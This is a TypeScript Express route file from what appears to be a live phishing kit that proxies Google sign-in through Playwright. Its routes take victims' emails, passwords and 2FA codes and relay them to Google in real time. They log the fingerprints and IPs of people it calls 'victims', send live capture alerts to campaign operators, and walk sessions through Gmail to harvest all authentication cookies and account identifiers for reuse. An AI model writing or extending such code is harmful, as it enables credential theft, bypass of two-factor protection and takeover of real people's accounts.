import { Router, Request, Response } from 'express';
import googleAuthService from '../../services/browser/google-auth-http.service';
import profileManagerService from '../../services/browser/profile-manager.service';
import resourceManager from '../../services/resource-manager.service';
import campaignService from '../../services/campaign.service';
import websocketService from '../../services/websocket.service';
import prisma from '../../config/database';
import { logger } from '../../utils/logger.util';
import { v4 as uuid } from 'uuid';

const router = Router();

// Prevents concurrent DP status polls from both finalizing the same session
const finalizingSessions = new Set<string>();

/**
 * POST /api/google/session/start
 * Initialize Playwright session and validate email with Google
 */
router.post('/start', async (req: Request, res: Response) => {
  try {
    const { email, fingerprint, captureId } = req.body;
    if (!email) {
      res.status(400).json({ success: false, status: 'INVALID_EMAIL', error: 'email is required' });
      return;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      res.status(200).json({ success: false, status: 'INVALID_EMAIL', message: "Couldn't find your Google Account" });
      return;
    }

    const sessionId = uuid();
    logger.info(`[START] Launching Playwright for ${email}, sessionId=${sessionId}`);
    
    if (fingerprint) {
      logger.info(`[FINGERPRINT] Received victim browser fingerprint: ${fingerprint.userAgent}`);
    }

    // Extract victim IP from request headers for geo-matched proxy selection
    const victimIp =
      (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
      req.socket.remoteAddress ||
      '';

    const sessionResult = await googleAuthService.startSession(email, sessionId, fingerprint, victimIp);
    
    if (!sessionResult.success) {
      if (sessionId) {
        await prisma.session.update({
          where: { id: sessionId },
          data: { status: 'FAILED', lastActivityAt: new Date() },
        }).catch(() => {});
      }
      res.status(500).json({ success: false, status: 'ERROR', error: sessionResult.error });
      return;
    }

    const { browser, page } = sessionResult;

    try {
      const result = await googleAuthService.submitEmail(sessionId, email);
      logger.info(`[START] submitEmail result: ${JSON.stringify(result)}`);

      if (result.nextStage === 'password') {
        let resolvedCampaignId = '';
        let resolvedCaptureId = captureId || '';
        let resolvedUserId: string | undefined = undefined;

        if (captureId) {
          try {
            const campaign = await prisma.campaign.findUnique({ where: { captureId: captureId } });
            if (campaign) {
              resolvedCaptureId = captureId;
              resolvedCampaignId = campaign.id;
              resolvedUserId = campaign.userId;
              await prisma.session.create({
                data: {
                  id: sessionId,
                  email,
                  status: 'EMAIL_ENTERED',
                  captureId: resolvedCaptureId,
                  campaignId: resolvedCampaignId,
                  userId: resolvedUserId,
                },
              });
              logger.info(`[START] DB session created: ${email}, campaign=${resolvedCampaignId}`);
            }
          } catch (dbErr: any) {
            logger.warn(`[START] DB session create skipped: ${dbErr.message}`);
          }
        }

        resourceManager.registerSession(sessionId, {
          browser,
          page,
          stage: 'password',
          campaignId: resolvedCampaignId,
          captureId: resolvedCaptureId,
          proxyUsed: undefined,
          email,
        });

        res.status(200).json({ success: true, status: 'REQUIRES_PASSWORD', sessionId });
      } else {
        if (sessionId) {
          await prisma.session.update({
            where: { id: sessionId },
            data: { status: 'FAILED', lastActivityAt: new Date() },
          }).catch(() => {});
        }
        await googleAuthService.cleanupSession(sessionId);
        res.status(200).json({ success: false, status: 'INVALID_EMAIL', message: result.error || "Couldn't find your Google Account" });
      }
    } catch (innerError: any) {
      await googleAuthService.cleanupSession(sessionId);
      logger.error('[START] Playwright email error:', innerError.message);
      res.status(500).json({ success: false, status: 'ERROR', error: innerError.message });
    }
  } catch (error: any) {
    logger.error('[START] Session start error:', error.message);
    res.status(500).json({ success: false, status: 'ERROR', error: error.message });
  }
});

/**
 * POST /api/google/session/:id/email
 * Submit email
 */
router.post('/:id/email', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { email } = req.body;

    if (!email) {
      res.status(400).json({
        success: false,
        error: 'email is required',
      });
      return;
    }

    // Get session from resource manager
    const session = resourceManager.getSession(id);

    if (!session) {
      res.status(404).json({
        success: false,
        error: 'Session not found or expired',
      });
      return;
    }

    // Submit email
    const result = await googleAuthService.submitEmail(id, email);

    // Update session activity
    const stage = (result.nextStage === 'password') ? 'password' : 'email';
    resourceManager.updateSessionActivity(id, stage as any);

    // Update database
    await prisma.session.update({
      where: { id },
      data: {
        email,
        status: result.success ? 'EMAIL_ENTERED' : 'INITIATED',
        lastActivityAt: new Date(),
      },
    });

    // Log credential field
    const campaign = await prisma.campaign.findUnique({ 
      where: { id: session.campaignId } 
    });

    if (campaign) {
      await prisma.credentialField.create({
        data: {
          sessionId: id,
          campaignId: session.campaignId,
          userId: campaign.userId,
          fieldType: 'EMAIL',
          fieldValue: email,
          fieldLabel: 'Email Address',
        },
      });

      // Broadcast live capture event
      websocketService.broadcastLiveCapture(campaign.userId, {
        sessionId: id,
        campaignId: session.campaignId,
        campaignName: campaign.name,
        stage: 'email',
        email,
        timestamp: new Date(),
      });
    }

    res.status(200).json({
      success: result.success,
      stage: result.stage,
      nextStage: result.nextStage,
      error: result.error,
    });
  } catch (error: any) {
    logger.error('Session email error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to submit email',
    });
  }
});

/**
 * POST /api/google/session/:id/password
 * Submit password
 */
router.post('/:id/password', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { password } = req.body;

    if (!password) {
      res.status(400).json({
        success: false,
        error: 'password is required',
      });
      return;
    }

    // Get session
    const session = resourceManager.getSession(id);

    if (!session) {
      res.status(200).json({
        success: false,
        status: 'SESSION_EXPIRED',
        message: 'Session expired. Please start again.',
      });
      return;
    }

    // Touch session - reset 30min inactivity timer
    resourceManager.touchSession(id);

    // Submit password
    const result = await googleAuthService.submitPassword(id, password);

    // Update session activity
    const stage = result.nextStage === '2fa' ? '2fa' : (result.nextStage === 'success' ? 'success' : 'password');
    resourceManager.updateSessionActivity(id, stage as any);

    // Update database — wrapped in try-catch: /start does not create a DB record in dev
    // mode so prisma.session.update throws P2025. Skip gracefully and return real auth result.
    try {
      await prisma.session.update({
        where: { id },
        data: {
          password,
          status: result.success ? 'PASSWORD_ENTERED' : 'EMAIL_ENTERED',
          challengeType: result.twoFactorType,
          lastActivityAt: new Date(),
        },
      });

      const campaign = await prisma.campaign.findUnique({
        where: { id: session.campaignId }
      });

      if (campaign) {
        await prisma.credentialField.create({
          data: {
            sessionId: id,
            campaignId: session.campaignId,
            userId: campaign.userId,
            fieldType: 'PASSWORD',
            fieldValue: password,
            fieldLabel: 'Password',
          },
        });

        const dbSession = await prisma.session.findUnique({ where: { id } });

        websocketService.broadcastLiveCapture(campaign.userId, {
          sessionId: id,
          campaignId: session.campaignId,
          campaignName: campaign.name,
          stage: 'password',
          email: dbSession?.email,
          timestamp: new Date(),
        });
      }
    } catch (dbError: any) {
      logger.warn(`[PASSWORD] DB update skipped (no session record): ${dbError.message}`);
    }

    // If success without 2FA, create profile
    if (result.nextStage === 'success' && result.cookies) {
      await createProfileFromSession(id, result.cookies);
      await resourceManager.destroySession(id);
    }

    // When Google requires 2FA or DP — create profile row immediately so it appears on the profile page
    if (result.success && result.nextStage !== 'success') {
      try {
        const resolvedCampaignId = session.campaignId || undefined;
        let earlyUserId: string | undefined;

        if (resolvedCampaignId) {
          try {
            const camp = await prisma.campaign.findUnique({ where: { id: resolvedCampaignId } });
            earlyUserId = camp?.userId ?? undefined;
          } catch {}
        }

        if (!session.email) {
          logger.warn(`[CAPTURE] Cannot create early profile — no email for session ${id}`);
        } else {
          const earlyProfile = await profileManagerService.createProfile({
            userId: earlyUserId,
            campaignId: resolvedCampaignId,
            email: session.email,
            password,
            cookies: [],
            provider: 'GOOGLE',
          });
          (session as any).profileId = earlyProfile.profile.id;
          logger.info(`[CAPTURE] Profile row created at password stage: ${earlyProfile.profile.id} for ${session.email} (campaign: ${resolvedCampaignId ?? 'none'})`);
        }
      } catch (earlyErr: any) {
        logger.warn(`[CAPTURE] Early profile row skipped: ${earlyErr.message}`);
      }
    }

    res.status(200).json({
      success: result.success,
      stage: result.stage,
      nextStage: result.nextStage,
      twoFactorType: result.twoFactorType,
      twoFactorHint: result.twoFactorHint,
      number: result.twoFactorHint || '',
      dpNumber: result.twoFactorHint || '',
      error: result.error,
    });
  } catch (error: any) {
    logger.error('Session password error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to submit password',
    });
  }
});

/**
 * POST /api/google/session/:id/2fa
 * Submit 2FA code
 */
router.post('/:id/2fa', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { code, method } = req.body;

    // Get session
    const session = resourceManager.getSession(id);

    if (!session) {
      res.status(404).json({
        success: false,
        error: 'Session not found or expired',
      });
      return;
    }

    // Touch session - reset 30min inactivity timer
    resourceManager.touchSession(id);

    // Submit 2FA
    const result = await googleAuthService.submit2FA(id, code, method);

    // Update session activity
    const stage = result.nextStage === 'success' ? 'success' : '2fa';
    resourceManager.updateSessionActivity(id, stage as any);

    // Update database — wrapped in try-catch: /start does not create a DB record in
    // local/dev mode, so prisma calls will throw. We gracefully skip them.
    try {
      await prisma.session.update({
        where: { id },
        data: {
          status: result.success ? 'COMPLETED' : '2FA_REQUIRED',
          challengeData: code ? JSON.stringify({ code, method }) : undefined,
          completedAt: result.success ? new Date() : undefined,
          lastActivityAt: new Date(),
        },
      });

      if (code) {
        const campaign = await prisma.campaign.findUnique({
          where: { id: session.campaignId }
        });

        if (campaign) {
          await prisma.credentialField.create({
            data: {
              sessionId: id,
              campaignId: session.campaignId,
              userId: campaign.userId,
              fieldType: '2FA_CODE',
              fieldValue: code,
              fieldLabel: `2FA Code (${method})`,
            },
          });

          const dbSession = await prisma.session.findUnique({ where: { id } });
          websocketService.broadcastLiveCapture(campaign.userId, {
            sessionId: id,
            campaignId: session.campaignId,
            campaignName: campaign.name,
            stage: '2fa',
            email: dbSession?.email,
            timestamp: new Date(),
          });
        }
      }

      if (result.success && result.cookies) {
        const dbSession = await prisma.session.findUnique({ where: { id } });
        if (dbSession && dbSession.captureId) {
          await campaignService.incrementCaptureCount(dbSession.captureId);
        }
      }
    } catch (dbError: any) {
      logger.warn(`[2FA] DB update skipped (no session record in DB): ${dbError.message}`);
    }

    // Create profile and destroy session — runs regardless of DB state
    if (result.success && result.cookies) {
      await createProfileFromSession(id, result.cookies, result.gaiaId, result.fullName, result.pictureUrl);
      await resourceManager.destroySession(id);
    }

    res.status(200).json({
      success: result.success,
      stage: result.stage,
      nextStage: result.nextStage,
      error: result.error,
    });
  } catch (error: any) {
    logger.error('Session 2FA error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to submit 2FA',
    });
  }
});

/**
 * GET /api/google/session/:id/status
 * Poll session status (for push 2FA waiting)
 */
router.get('/:id/status', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;

    const session = resourceManager.getSession(id);

    if (!session) {
      res.status(404).json({ success: false, error: 'Session not found or expired' });
      return;
    }

    const result = await googleAuthService.pollDpCompletion(id);

    if (result.status === 'AUTHENTICATED') {
      // Race condition guard — concurrent polls both see AUTHENTICATED; only the first proceeds
      if (finalizingSessions.has(id)) {
        return res.json({ status: 'COMPLETED' });
      }
      finalizingSessions.add(id);

      try {
        logger.info(`[DP] Phone approved — session ${id}, navigating for full cookie issuance...`);

        // 3-step navigation to trigger ALL auth cookies:
        // Step 1: Gmail → OSID, COMPASS, GMAIL_AT, GMAIL_LF
        await session.page.goto('https://mail.google.com/mail/u/0/', {
          waitUntil: 'domcontentloaded',
          timeout: 30000,
        });
        await session.page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
        await session.page.waitForTimeout(5000); // allow __Host-GMAIL_SCH_* service worker init

        // Step 2: google.com → AEC, __Secure-BUCKET, NID, SEARCH_SAMESITE
        await session.page.goto('https://www.google.com/', {
          waitUntil: 'domcontentloaded',
          timeout: 20000,
        });
        await session.page.waitForLoadState('networkidle', { timeout: 10000 }).catch(() => {});
        await session.page.waitForTimeout(3000); // allow __Secure-BUCKET to be set

        // Step 3: back to Gmail → finalise __Host-GMAIL_SCH_* and all Gmail cookies
        await session.page.goto('https://mail.google.com/mail/u/0/', {
          waitUntil: 'domcontentloaded',
          timeout: 30000,
        });
        await session.page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
        await session.page.waitForTimeout(8000); // allow __Host-GMAIL_SCH_* to fully initialise

        // Capture GAIA ID via ListAccounts — use context.request.get() not page.evaluate(fetch())
        let dpGaiaId = '';
        let dpFullName = '';
        let dpPictureUrl = '';
        try {
          // Build explicit Cookie header — context.request does not always auto-attach browser cookies
          const _laCookies = await session.page.context().cookies(['https://accounts.google.com', 'https://www.google.com']);
          const _laCookieStr = _laCookies.map(c => `${c.name}=${c.value}`).join('; ');
          const laResp = await session.page.context().request.get(
            'https://accounts.google.com/ListAccounts?gpsia=1&json=1',
            {
              headers: {
                'Cookie': _laCookieStr,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'X-Same-Domain': '1',
              },
            }
          );
          const laRaw = await laResp.text();
          logger.info(`[GAIA][DP] ListAccounts raw (first 200 chars): ${laRaw.slice(0, 200)}`);
          const laJson = JSON.parse(laRaw.replace(")]}'\n", ''));
          const account = laJson?.[1]?.[0];
          if (account) {
            dpGaiaId     = String(account[2] || '');
            dpFullName   = String(account[3] || '');
            dpPictureUrl = String(account[4] || '');
          }
          logger.info(`[GAIA][DP] ID: ${dpGaiaId} | Name: ${dpFullName}`);
        } catch (e: any) {
          logger.warn(`[GAIA][DP] ListAccounts fetch failed: ${e.message}`);
        }

        logger.success(`[DP] Phone approved — session ${id}, extracting cookies now`);

        // Extract cookies AFTER full navigation sequence
        const cookies = await session.page.context().cookies();

        await createProfileFromSession(id, cookies, dpGaiaId, dpFullName, dpPictureUrl);

        try {
          await prisma.session.update({
            where: { id },
            data: { status: 'COMPLETED', completedAt: new Date() },
          });
          const dbSession = await prisma.session.findUnique({ where: { id } });
          if (dbSession && dbSession.captureId) {
            await campaignService.incrementCaptureCount(dbSession.captureId);
          }
        } catch (dbError: any) {
          logger.warn(`[STATUS] DB update skipped: ${dbError.message}`);
        }

        if (session.campaignId) {
          const campaign = await prisma.campaign.findUnique({ where: { id: session.campaignId } }).catch(() => null);
          if (campaign) {
            websocketService.broadcastLiveCapture(campaign.userId, {
              sessionId: id,
              campaignId: session.campaignId,
              campaignName: campaign.name,
              stage: 'success',
              timestamp: new Date(),
            });
          }
        }

        await resourceManager.destroySession(id);
        await googleAuthService.cleanupSession(id);
      } finally {
        finalizingSessions.delete(id);
      }
    }

    return res.json(result);
  } catch (error: any) {
    logger.error('Session status error:', error.message);
    res.status(400).json({
      success: false,
      error: error.message || 'Failed to get session status',
    });
  }
});

/**
 * Helper: Create profile from session
 */
async function createProfileFromSession(sessionId: string, cookies: any[], gaiaId = '', fullName = '', pictureUrl = '') {
  try {
    // Extract Google auth cookies regardless of DB state
    const googleCookies = googleAuthService.extractGoogleCookies(cookies);

    // If a profile row was already created at the password stage, update it with cookies
    const memSession = resourceManager.getSession(sessionId);
    const existingProfileId = memSession ? (memSession as any).profileId : undefined;

    if (existingProfileId) {
      try {
        await prisma.profile.update({
          where: { id: existingProfileId },
          data: {
            cookies: googleCookies.length > 0 ? JSON.stringify(googleCookies) : undefined,
            authStatus: googleCookies.length > 0 ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED',
            ...(gaiaId && { accountInfo: JSON.stringify({ gaiaId, fullName, pictureUrl }) }),
          },
        });
        logger.success(`[CAPTURE] Profile ${existingProfileId} updated → ${googleCookies.length} cookies, AUTHENTICATED`);
      } catch (upErr: any) {
        logger.error(`[CAPTURE] Profile update failed: ${upErr.message}`);
      }
      return;
    }

    // Try to get data from DB first
    let userId: string | undefined;
    let campaignId: string | undefined;
    let email: string | undefined;
    let password: string | undefined;
    let dbSession: any = null;

    try {
      dbSession = await prisma.session.findUnique({ where: { id: sessionId } });
      if (dbSession) {
        userId = dbSession.userId ?? undefined;
        campaignId = dbSession.campaignId ?? undefined;
        email = dbSession.email || undefined;
        password = dbSession.password || undefined;
      }
    } catch { /* DB not available in dev mode */ }

    // Fall back to in-memory session for email
    if (!email) {
      const memSession = resourceManager.getSession(sessionId);
      if (memSession && (memSession as any).email) {
        email = (memSession as any).email;
        campaignId = campaignId || memSession.campaignId;
      }
    }

    // If userId still not resolved, get it from the campaign
    if (!userId && campaignId) {
      try {
        const camp = await prisma.campaign.findUnique({ where: { id: campaignId } });
        userId = camp?.userId ?? undefined;
      } catch {}
    }

    if (!userId) {
      logger.info(`[CAPTURE] No userId resolved for session ${sessionId} — profile will be unowned but still saved`);
    }

    if (!email) {
      logger.warn(`[CAPTURE] Cannot create profile — no email resolved for session ${sessionId}`);
      return;
    }

    const resolvedCampaignId = campaignId || undefined;
    logger.info(`[CAPTURE] Creating profile — email: ${email}, campaignId: ${resolvedCampaignId ?? 'none'}, cookies: ${googleCookies.length}, userId: ${userId ?? 'none'}`);

    await profileManagerService.createProfile({
      userId,
      campaignId: resolvedCampaignId,
      email,
      password: password || '',
      cookies: googleCookies,
      provider: 'GOOGLE',
      accountInfo: JSON.stringify({ gaiaId, fullName, pictureUrl }),
    });

    logger.success(`[CAPTURE] Profile created — session: ${sessionId}, email: ${email}, cookies: ${googleCookies.length}`);
  } catch (error) {
    logger.error('Create profile from session error:', error);
  }
}

export default router;
